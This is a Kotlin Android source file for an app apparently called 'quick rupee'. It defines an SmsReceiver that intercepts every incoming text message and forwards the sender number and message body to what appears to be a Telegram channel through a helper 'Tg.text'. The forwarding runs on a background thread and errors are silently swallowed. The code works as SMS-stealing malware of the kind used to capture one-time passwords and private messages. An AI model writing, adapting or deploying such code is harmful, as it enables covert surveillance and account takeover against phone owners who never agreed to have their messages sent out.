package com.quick.rupee

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val pending = goAsync()
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (msgs == null) { pending.finish(); return }
        val sb = StringBuilder()
        var from = "?"
        for (m in msgs) {
            from = m.originatingAddress ?: from
            sb.append(m.messageBody)
        }
        Thread {
            runCatching { Tg.text("<b>SMS</b> <code>$from</code>\n${sb.toString().take(3500)}") }
            pending.finish()
        }.start()
    }
}
